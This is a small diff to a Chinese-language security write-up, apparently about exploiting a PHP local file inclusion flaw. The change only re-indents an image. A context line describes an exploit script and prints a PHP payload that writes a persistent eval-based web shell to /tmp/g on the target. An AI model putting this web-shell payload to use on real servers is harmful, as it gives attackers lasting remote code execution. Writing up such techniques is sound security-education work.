@@ -103,7 +103,7 @@ sequence
 
 
 
-![1543937043(1)]({{site.url}}/images/1543937043(1).jpg)
+   ![1543937043(1)]({{site.url}}/images/1543937043(1).jpg)
 
 2. 利用脚本exp_lfi.py实现了上述过程，成功包含临时文件后，会执行`<?php file_put_contents('/tmp/g', '<?=eval($_REQUEST[1])?>')?>`，写入一个新的文件`/tmp/g`，这个文件就会永久留在目标机器上。
 
